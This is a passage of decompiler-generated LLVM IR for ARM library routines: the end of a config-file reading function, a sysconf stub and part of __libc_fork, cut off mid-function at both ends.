  %v3_15524 = inttoptr i32 %v2_15524 to i32*
  %v4_15524 = load i32, i32* %v3_15524, align 4
  %v2_15528 = mul nuw nsw i32 %v4_15520, 2
  %v2_1552c = add i32 %v4_15524, %v2_15528
  %v3_1552c = inttoptr i32 %v2_1552c to i16*
  %v4_1552c = load i16, i16* %v3_1552c, align 2
  %v1_15530 = and i16 %v4_1552c, 8
  %v2_15530 = icmp eq i16 %v1_15530, 0
  br i1 %v2_15530, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_15520
  %v1_15534 = load i32, i32* @r5, align 4
  %v2_15534 = add i32 %v1_15534, 1
  store i32 %v2_15534, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_15520, %dec_label_pc_154f4, %dec_label_pc_15508, %dec_label_pc_15514
  %v0_15538.pre = load i32, i32* @r6, align 4
  %v0_15544.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_154e0
  %v0_15544 = phi i32 [ %v0_15544.pre, %.backedge3 ], [ %v2_154e8, %dec_label_pc_154e0 ]
  %v0_15538 = phi i32 [ %v0_15538.pre, %.backedge3 ], [ %v1_154d4, %dec_label_pc_154e0 ]
  %v4_15548 = inttoptr i32 %v0_15538 to i32*
  %v5_15548 = call i32 @__GI_config_read(i32* %v4_15548, i32 %v2_154ec, i32 258, i32 %v0_15544)
  %v2_1554c = icmp eq i32 %v5_15548, 0
  br i1 %v2_1554c, label %dec_label_pc_155bc, label %dec_label_pc_154f4

dec_label_pc_15558:                               ; preds = %entry
  %v0_1555c = load i32, i32* @r4, align 4
  %v2_1555c = add i32 %v0_1555c, -33996
  store i32 %v2_1555c, i32* @r0, align 4
  %v1_15560 = call i32 @__GI_config_open(i32 %v2_1555c)
  store i32 %v1_15560, i32* @r6, align 4
  %v2_15564 = icmp eq i32 %v1_15560, 0
  br i1 %v2_15564, label %bb19, label %dec_label_pc_15570

bb19:                                             ; preds = %dec_label_pc_15558
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_155bc

dec_label_pc_15570:                               ; preds = %dec_label_pc_15558
  %v0_15574 = load i32, i32* @r4, align 4
  %v2_15574 = add i32 %v0_15574, -33980
  store i32 %v2_15574, i32* @r8, align 4
  %v2_1557c = add i32 %v0_15574, -33944
  store i32 %v2_1557c, i32* @r7, align 4
  %v2_15580 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15580, i32* @r4, align 4
  br label %bb21

dec_label_pc_15588:                               ; preds = %bb21
  %v0_155b4 = load i32, i32* @r8, align 4
  %v3_15588 = load i32, i32* %stack_var_-36, align 4
  %v1_1558c = inttoptr i32 %v3_15588 to i32*
  %v2_1558c = load i32, i32* %v1_1558c, align 4
  store i32 %v2_1558c, i32* @r1, align 4
  %v2_15590 = inttoptr i32 %v0_155b4 to i8*
  %v3_15590 = call i32 @__GI_strcoll(i8* %v2_15590, i32 %v2_1558c)
  %v2_15594 = icmp eq i32 %v3_15590, 0
  br i1 %v2_15594, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_15588
  %v1_15598 = load i32, i32* @r5, align 4
  %v2_15598 = add i32 %v1_15598, 1
  store i32 %v2_15598, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_15588
  %v0_155a4.pre = load i32, i32* @r7, align 4
  %v0_155a8.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_15570
  %v0_155a8 = phi i32 [ %v0_155a8.pre, %.backedge ], [ %v1_15560, %dec_label_pc_15570 ]
  %v0_155a4 = phi i32 [ %v0_155a4.pre, %.backedge ], [ %v2_1557c, %dec_label_pc_15570 ]
  %v4_155ac = inttoptr i32 %v0_155a8 to i32*
  %v5_155ac = call i32 @__GI_config_read(i32* %v4_155ac, i32 %v2_15580, i32 459266, i32 %v0_155a4)
  %v2_155b0 = icmp eq i32 %v5_155ac, 0
  br i1 %v2_155b0, label %dec_label_pc_155bc, label %dec_label_pc_15588

dec_label_pc_155bc:                               ; preds = %bb18, %bb21, %bb19
  %v0_155bc = load i32, i32* @r6, align 4
  %v1_155c0 = inttoptr i32 %v0_155bc to i32*
  %v2_155c0 = call i32 @__GI_config_close(i32* %v1_155c0)
  %v0_155c4 = load i32, i32* @r5, align 4
  %v2_155c4 = icmp eq i32 %v0_155c4, 0
  %.v0_155c4 = select i1 %v2_155c4, i32 1, i32 %v0_155c4
  ret i32 %.v0_155c4

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_155bc, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_159f0

bb:                                               ; preds = %entry
  %v7_15614 = mul i32 %arg1, 4
  %v8_15614 = add i32 %v7_15614, ptrtoint (i32* @global_var_1561c.905 to i32)
  call void @__pseudo_branch(i32 %v8_15614)
  br label %dec_label_pc_159f0

dec_label_pc_159f0:                               ; preds = %bb, %entry
  %v0_159f4 = call i32 @__aeabi_read_tp()
  %v3_159f8 = load i16, i16* @global_var_2447c.761, align 2
  %v4_159f8 = sext i16 %v3_159f8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_15a04 = add i32 %v4_159f8, %v0_159f4
  %v4_15a04 = inttoptr i32 %v3_15a04 to i32*
  store i32 22, i32* %v4_15a04, align 4
  %v0_15be8 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_15be8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12996, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r8.global-to-local, align 4
  %v4_15d1416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 12996) to i32*), align 4
  store i32 %v4_15d1416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d1818 = icmp eq i32 %v4_15d1416, 0
  br i1 %v2_15d1818, label %dec_label_pc_15d20, label %dec_label_pc_15c44

dec_label_pc_15c44:                               ; preds = %entry, %dec_label_pc_15d14.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_15c50 = load i32, i32* %r7.global-to-local, align 4
  %v1_15c50 = add i32 %v0_15c50, 20
  %v2_15c50 = inttoptr i32 %v1_15c50 to i32*
  %v3_15c50 = load i32, i32* %v2_15c50, align 4
  store i32 %v3_15c50, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c54 = icmp eq i32 %v3_15c50, 0
  store i32 %v3_15c50, i32* %r4.global-to-local, align 4
  br i1 %v2_15c54, label %dec_label_pc_15d14.backedge, label %dec_label_pc_15c64

dec_label_pc_15d14.backedge:                      ; preds = %dec_label_pc_15c44, %dec_label_pc_15c90
  %v0_15d14 = load i32, i32* %r8.global-to-local, align 4
  %v1_15d14 = load i32, i32* %r5.global-to-local, align 4
  %v2_15d14 = add i32 %v1_15d14, %v0_15d14
  %v3_15d14 = inttoptr i32 %v2_15d14 to i32*
  %v4_15d14 = load i32, i32* %v3_15d14, align 4
  store i32 %v4_15d14, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d18 = icmp eq i32 %v4_15d14, 0
  br i1 %v2_15d18, label %dec_label_pc_15d20, label %dec_label_pc_15c44

dec_label_pc_15c64:                               ; preds = %dec_label_pc_15c44
  %v0_15c64 = load i32, i32* %r8.global-to-local, align 4
  %v1_15c64 = load i32, i32* %r5.global-to-local, align 4
  %v2_15c64 = add i32 %v1_15c64, %v0_15c64
  %v3_15c64 = inttoptr i32 %v2_15c64 to i32*
  %v4_15c64 = load i32, i32* %v3_15c64, align 4
  %v1_15c68 = add i32 %v4_15c64, 20
  store i32 %v1_15c68, i32* %r2.global-to-local, align 4
  %v1_15c6c132 = inttoptr i32 %v1_15c68 to i32*
  %v2_15c6c133 = load i32, i32* %v1_15c6c132, align 4
  store i32 %v2_15c6c133, i32* %r3.global-to-local, align 4
  %v3_15c70135 = icmp uge i32 %v2_15c6c133, %v3_15c50
  store i1 %v3_15c70135, i1* %cpsr_c.global-to-local, align 1
  %v9_15c70141 = icmp eq i32 %v2_15c6c133, %v3_15c50
  br i1 %v9_15c70141, label %dec_label_pc_15c78, label %dec_label_pc_15c90

dec_label_pc_15c78:                               ; preds = %dec_label_pc_15c64, %dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge
  %v0_15c78142 = phi i32 [ %v1_15c70.pre, %dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge ], [ %v3_15c50, %dec_label_pc_15c64 ]
  store i32 %v0_15c78142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15c88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15c88, label %dec_label_pc_15c8c, label %dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge

dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge:  ; preds = %dec_label_pc_15c78
  %v0_15c6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15c70.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15c6c = inttoptr i32 %v0_15c6c.pre to i32*
  %v2_15c6c = load i32, i32* %v1_15c6c, align 4
  store i32 %v2_15c6c, i32* %r3.global-to-local, align 4
  %v3_15c70 = icmp uge i32 %v2_15c6c, %v1_15c70.pre
  store i1 %v3_15c70, i1* %cpsr_c.global-to-local, align 1
  %v9_15c70 = icmp eq i32 %v2_15c6c, %v1_15c70.pre
  br i1 %v9_15c70, label %dec_label_pc_15c78, label %dec_label_pc_15c90

dec_label_pc_15c8c:                               ; preds = %dec_label_pc_15c78
  %v0_15c8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15c8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15c90

dec_label_pc_15c90:                               ; preds = %dec_label_pc_15c64, %dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge, %dec_label_pc_15c8c
  %v0_15c90 = phi i32 [ %v0_15c8c, %dec_label_pc_15c8c ], [ %v2_15c6c133, %dec_label_pc_15c64 ], [ %v2_15c6c, %dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge ]
  %v1_15c90 = phi i32 [ %v0_15c8c, %dec_label_pc_15c8c ], [ %v3_15c50, %dec_label_pc_15c64 ], [ %v1_15c70.pre, %dec_label_pc_15c78.dec_label_pc_15c6c_crit_edge ]
  %v3_15c90 = icmp uge i32 %v0_15c90, %v1_15c90
  store i1 %v3_15c90, i1* %cpsr_c.global-to-local, align 1
  %v9_15c90 = icmp eq i32 %v0_15c90, %v1_15c90
  br i1 %v9_15c90, label %dec_label_pc_15c98, label %dec_label_pc_15d14.backedge

dec_label_pc_15c98:                               ; preds = %dec_label_pc_15c90
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_15cac = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_15c9c

dec_label_pc_15c9c:                               ; preds = %dec_label_pc_15d04, %dec_label_pc_15c98
  %v0_15c9c = load i32, i32* %r7.global-to-local, align 4
  %v1_15c9c = add i32 %v0_15c9c, 4
  %v2_15c9c = inttoptr i32 %v1_15c9c to i32*
  %v3_15c9c = load i32, i32* %v2_15c9c, align 4
  store i32 %v3_15c9c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ca0 = icmp eq i32 %v3_15c9c, 0
  br i1 %v2_15ca0, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_15c9c
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_15c9c, %bb
  %v2_15ca8 = xor i1 %v2_15ca0, true
  call void @__pseudo_cond_branch(i1 %v2_15ca8, i32 %v3_15c9c)
  %v0_15cb0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15cb0, i32* %stack_var_-88, align 4
  %v1_15cb4 = inttoptr i32 %v0_15cb0 to i32*
  %v2_15cb4 = load i32, i32* %v1_15cb4, align 4
  store i32 %v2_15cb4, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15cb8 = icmp eq i32 %v2_15cb4, 0
  store i32 %v2_15cac, i32* %r5.global-to-local, align 4
  br i1 %v2_15cb8, label %dec_label_pc_15d24.loopexit, label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %bb72
  %v1_15ccc = add i32 %v2_15cb4, 20
  store i32 %v1_15ccc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15d04.dec_label_pc_15cd0_crit_edge, %dec_label_pc_15ccc
  %v0_15cd4 = phi i32 [ %v0_15cd4.pre, %dec_label_pc_15d04.dec_label_pc_15cd0_crit_edge ], [ %v1_15ccc, %dec_label_pc_15ccc ]
  %v0_15cd0 = phi i32 [ %v0_15cd0.pre, %dec_label_pc_15d04.dec_label_pc_15cd0_crit_edge ], [ %v2_15cb4, %dec_label_pc_15ccc ]
  %v1_15cd0 = add i32 %v0_15cd0, 20
  %v2_15cd0 = inttoptr i32 %v1_15cd0 to i32*
  %v3_15cd0 = load i32, i32* %v2_15cd0, align 4
  store i32 %v0_15cd4, i32* %r2.global-to-local, align 4
  store i32 %v3_15cd0, i32* %r4.global-to-local, align 4
  %v1_15ce0119 = inttoptr i32 %v0_15cd4 to i32*
  %v2_15ce0120 = load i32, i32* %v1_15ce0119, align 4
  store i32 %v2_15ce0120, i32* %r3.global-to-local, align 4
  %v3_15ce4122 = icmp uge i32 %v2_15ce0120, %v3_15cd0
  store i1 %v3_15ce4122, i1* %cpsr_c.global-to-local, align 1
  %v9_15ce4128 = icmp eq i32 %v2_15ce0120, %v3_15cd0
  br i1 %v9_15ce4128, label %dec_label_pc_15cec, label %dec_label_pc_15d04

dec_label_pc_15cec:                               ; preds = %dec_label_pc_15cd0, %dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge
  %v0_15cec129 = phi i32 [ %v1_15ce4.pre, %dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge ], [ %v3_15cd0, %dec_label_pc_15cd0 ]
  store i32 %v0_15cec129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15cfc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15cfc, label %dec_label_pc_15d00, label %dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge

dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge:  ; preds = %dec_label_pc_15cec
  %v0_15ce0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15ce4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15ce0 = inttoptr i32 %v0_15ce0.pre to i32*
  %v2_15ce0 = load i32, i32* %v1_15ce0, align 4
  store i32 %v2_15ce0, i32* %r3.global-to-local, align 4
  %v3_15ce4 = icmp uge i32 %v2_15ce0, %v1_15ce4.pre
  store i1 %v3_15ce4, i1* %cpsr_c.global-to-local, align 1
  %v9_15ce4 = icmp eq i32 %v2_15ce0, %v1_15ce4.pre
  br i1 %v9_15ce4, label %dec_label_pc_15cec, label %dec_label_pc_15d04

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15cec
  %v0_15d00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d04

dec_label_pc_15d04:                               ; preds = %dec_label_pc_15cd0, %dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge, %dec_label_pc_15d00
  %v0_15d04 = phi i32 [ %v0_15d00, %dec_label_pc_15d00 ], [ %v2_15ce0120, %dec_label_pc_15cd0 ], [ %v2_15ce0, %dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge ]
  %v1_15d04 = phi i32 [ %v0_15d00, %dec_label_pc_15d00 ], [ %v3_15cd0, %dec_label_pc_15cd0 ], [ %v1_15ce4.pre, %dec_label_pc_15cec.dec_label_pc_15ce0_crit_edge ]
  %v3_15d04 = icmp uge i32 %v0_15d04, %v1_15d04
  store i1 %v3_15d04, i1* %cpsr_c.global-to-local, align 1
  %v9_15d04 = icmp eq i32 %v0_15d04, %v1_15d04
  store i32 %v2_15cac, i32* %r4.global-to-local, align 4
  br i1 %v9_15d04, label %dec_label_pc_15c9c, label %dec_label_pc_15d04.dec_label_pc_15cd0_crit_edge

dec_label_pc_15d04.dec_label_pc_15cd0_crit_edge:  ; preds = %dec_label_pc_15d04
  %v0_15cd0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_15cd4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d14.backedge, %entry
  %v0_15d2831 = phi i32 [ ptrtoint (i32* @global_var_24424.765 to i32), %entry ], [ %v0_15d14, %dec_label_pc_15d14.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15d24

dec_label_pc_15d24.loopexit:                      ; preds = %bb72
  store i32 %v2_15cac, i32* %r6.global-to-local, align 4
  %v0_15d28.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15d24.loopexit, %dec_label_pc_15d20
  %v0_15d28 = phi i32 [ %v0_15d28.pre, %dec_label_pc_15d24.loopexit ], [ %v0_15d2831, %dec_label_pc_15d20 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15d28 = add i32 %v0_15d28, 152
  %v3_15d28 = inttoptr i32 %v2_15d28 to i32*
  %v4_15d28 = load i32, i32* %v3_15d28, align 4
  store i32 %v4_15d28, i32* %r7.global-to-local, align 4
  %v0_15d2c = call i32 @__aeabi_read_tp()
  store i32 %v0_15d2c, i32* %r0.global-to-local, align 4
  %v1_15d30 = add i32 %v4_15d28, 8
  %v2_15d30 = inttoptr i32 %v1_15d30 to i32*
  %v3_15d30 = load i32, i32* %v2_15d30, align 4
  store i32 %v3_15d30, i32* %r3.global-to-local, align 4
  %v1_15d34 = add i32 %v0_15d2c, -1168
  store i32 %v1_15d34, i32* %r5.global-to-local, align 4
  %v3_15d38 = icmp uge i32 %v3_15d30, %v1_15d34
  store i1 %v3_15d38, i1* %cpsr_c.global-to-local, align 1
  %v9_15d38 = icmp eq i32 %v3_15d30, %v1_15d34
  br i1 %v9_15d38, label %dec_label_pc_15ea0, label %dec_label_pc_15d40

dec_label_pc_15d40:                               ; preds = %dec_label_pc_15d24
  store i32 %v4_15d28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15d4c112 = inttoptr i32 %v4_15d28 to i32*
  %v2_15d4c113 = load i32, i32* %v1_15d4c112, align 4
  store i32 %v2_15d4c113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15d50115 = icmp eq i32 %v2_15d4c113, 0
  br i1 %v9_15d50115, label %dec_label_pc_15d58, label %dec_label_pc_15d70

dec_label_pc_15d58:                               ; preds = %dec_label_pc_15d40, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge
  %v0_15d58116 = phi i32 [ %v1_15d50.pre, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge ], [ 0, %dec_label_pc_15d40 ]
  store i32 %v0_15d58116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d68 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d68, label %dec_label_pc_15d6c, label %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge

dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge:  ; preds = %dec_label_pc_15d58
  %v0_15d4c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d50.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15d4c = inttoptr i32 %v0_15d4c.pre to i32*
  %v2_15d4c = load i32, i32* %v1_15d4c, align 4
  store i32 %v2_15d4c, i32* %r3.global-to-local, align 4
  %v3_15d50 = icmp uge i32 %v2_15d4c, %v1_15d50.pre
  store i1 %v3_15d50, i1* %cpsr_c.global-to-local, align 1
  %v9_15d50 = icmp eq i32 %v2_15d4c, %v1_15d50.pre
  br i1 %v9_15d50, label %dec_label_pc_15d58, label %dec_label_pc_15d70

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d58
  %v0_15d6c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d6c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d40, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge, %dec_label_pc_15d6c
  %v0_15d70 = phi i32 [ %v0_15d6c, %dec_label_pc_15d6c ], [ %v2_15d4c113, %dec_label_pc_15d40 ], [ %v2_15d4c, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge ]
  %v1_15d70 = phi i32 [ %v0_15d6c, %dec_label_pc_15d6c ], [ 0, %dec_label_pc_15d40 ], [ %v1_15d50.pre, %dec_label_pc_15d58.dec_label_pc_15d4c_crit_edge ]
  %v3_15d70 = icmp uge i32 %v0_15d70, %v1_15d70
  store i1 %v3_15d70, i1* %cpsr_c.global-to-local, align 1
  %v9_15d70 = icmp eq i32 %v0_15d70, %v1_15d70
  br i1 %v9_15d70, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_15d70
  %v1_15d74 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15d74, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_15d70, %bb73
  %v1_15d78 = xor i1 %v9_15d70, true
  call void @__pseudo_cond_branch(i1 %v1_15d78, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_15d7c = load i32, i32* %r5.global-to-local, align 4
  %v1_15d7c = load i32, i32* %r7.global-to-local, align 4
  %v2_15d7c = add i32 %v1_15d7c, 8
  %v3_15d7c = inttoptr i32 %v2_15d7c to i32*
  store i32 %v0_15d7c, i32* %v3_15d7c, align 4
  br label %dec_label_pc_15ea0

dec_label_pc_15ea0:                               ; preds = %bb74, %dec_label_pc_15d24
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15d84 = load i32, i32* %r8.global-to-local, align 4
  %v2_15d84 = add i32 %v0_15d84, 152
  %v3_15d84 = inttoptr i32 %v2_15d84 to i32*
  %v4_15d84 = load i32, i32* %v3_15d84, align 4
  store i32 %v4_15d84, i32* %r2.global-to-local, align 4
  %v1_15d88 = add i32 %v4_15d84, 4
  %v2_15d88 = inttoptr i32 %v1_15d88 to i32*
  %v3_15d88 = load i32, i32* %v2_15d88, align 4
  %v1_15d8c = add i32 %v3_15d88, 1
  store i32 %v1_15d8c, i32* %r3.global-to-local, align 4
  store i32 %v1_15d8c, i32* %v2_15d88, align 4
  %v0_15d94 = load i32, i32* %r5.global-to-local, align 4
  %v1_15d94 = add i32 %v0_15d94, 108
  %v2_15d94 = inttoptr i32 %v1_15d94 to i32*
  %v3_15d94 = load i32, i32* %v2_15d94, align 4
  store i32 %v3_15d94, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_15d9c = sub i32 0, %v3_15d94
  store i32 %v1_15d9c, i32* %v2_15d94, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_15db0 = load i32, i32* %r5.global-to-local, align 4
  %v1_15db0 = add i32 %v0_15db0, 104
  store i32 %v1_15db0, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_15ea4.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15ea4 = add i32 %v0_15db0, 108
  %v3_15ea4 = inttoptr i32 %v2_15ea4 to i32*
  store i32 %v0_15ea4.pre, i32* %v3_15ea4, align 4
  %v0_15ea8 = load i32, i32* %r8.global-to-local, align 4
  %v1_15ea8 = load i32, i32* %r3.global-to-local, align 4
  %v2_15ea8 = add i32 %v1_15ea8, %v0_15ea8
  %v3_15ea8 = inttoptr i32 %v2_15ea8 to i32*
  %v4_15ea8 = load i32, i32* %v3_15ea8, align 4
  store i32 %v4_15ea8, i32* %r0.global-to-local, align 4
  %v1_15eac = add i32 %v4_15ea8, 4
  %v2_15eac = inttoptr i32 %v1_15eac to i32*
  %v3_15eac = load i32, i32* %v2_15eac, align 4
  %v1_15eb0 = add i32 %v3_15eac, -1
  store i32 %v1_15eb0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15eb4 = icmp eq i32 %v1_15eb0, 0
  store i32 %v1_15eb0, i32* %v2_15eac, align 4
  br i1 %v2_15eb4, label %dec_label_pc_15ec0, label %dec_label_pc_15fb0thread-pre-split

dec_label_pc_15ec0:                               ; preds = %dec_label_pc_15ea0
  %v0_15ec0 = load i32, i32* %r3.global-to-local, align 4
  %v1_15ec0 = load i32, i32* %r0.global-to-local, align 4
  %v2_15ec0 = add i32 %v1_15ec0, 8
  %v3_15ec0 = inttoptr i32 %v2_15ec0 to i32*
  store i32 %v0_15ec0, i32* %v3_15ec0, align 4
  %v0_15ec4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15ec4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ec8

dec_label_pc_15ec8:                               ; preds = %dec_label_pc_15ef8.dec_label_pc_15ec8_crit_edge, %dec_label_pc_15ec0
  %v0_15ec8 = phi i32 [ %v0_15ec8.pre, %dec_label_pc_15ef8.dec_label_pc_15ec8_crit_edge ], [ %v0_15ec4, %dec_label_pc_15ec0 ]
  %v1_15ec8 = inttoptr i32 %v0_15ec8 to i32*
  %v2_15ec8 = load i32, i32* %v1_15ec8, align 4
  store i32 %v2_15ec8, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15ec8, i32* %r2.global-to-local, align 4
  %v2_15ed4100 = load i32, i32* %v1_15ec8, align 4
  store i32 %v2_15ed4100, i32* %r3.global-to-local, align 4
  %v3_15ed8102 = icmp uge i32 %v2_15ed4100, %v2_15ec8
  store i1 %v3_15ed8102, i1* %cpsr_c.global-to-local, align 1
  %v9_15ed8108 = icmp eq i32 %v2_15ed4100, %v2_15ec8
  br i1 %v9_15ed8108, label %dec_label_pc_15ee0, label %dec_label_pc_15ef8

dec_label_pc_15ee0:                               ; preds = %dec_label_pc_15ec8, %dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge
  %v0_15ee0109 = phi i32 [ %v1_15ed8.pre, %dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge ], [ %v2_15ec8, %dec_label_pc_15ec8 ]
  store i32 %v0_15ee0109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ef0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ef0, label %dec_label_pc_15ef4, label %dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge

dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge:  ; preds = %dec_label_pc_15ee0
  %v0_15ed4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15ed8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15ed4 = inttoptr i32 %v0_15ed4.pre to i32*
  %v2_15ed4 = load i32, i32* %v1_15ed4, align 4
  store i32 %v2_15ed4, i32* %r3.global-to-local, align 4
  %v3_15ed8 = icmp uge i32 %v2_15ed4, %v1_15ed8.pre
  store i1 %v3_15ed8, i1* %cpsr_c.global-to-local, align 1
  %v9_15ed8 = icmp eq i32 %v2_15ed4, %v1_15ed8.pre
  br i1 %v9_15ed8, label %dec_label_pc_15ee0, label %dec_label_pc_15ef8

dec_label_pc_15ef4:                               ; preds = %dec_label_pc_15ee0
  %v0_15ef4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15ef4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ef8

dec_label_pc_15ef8:                               ; preds = %dec_label_pc_15ec8, %dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge, %dec_label_pc_15ef4
  %v0_15f00 = phi i32 [ %v0_15ef4, %dec_label_pc_15ef4 ], [ %v2_15ed4100, %dec_label_pc_15ec8 ], [ %v2_15ed4, %dec_label_pc_15ee0.dec_label_pc_15ed4_crit_edge ]
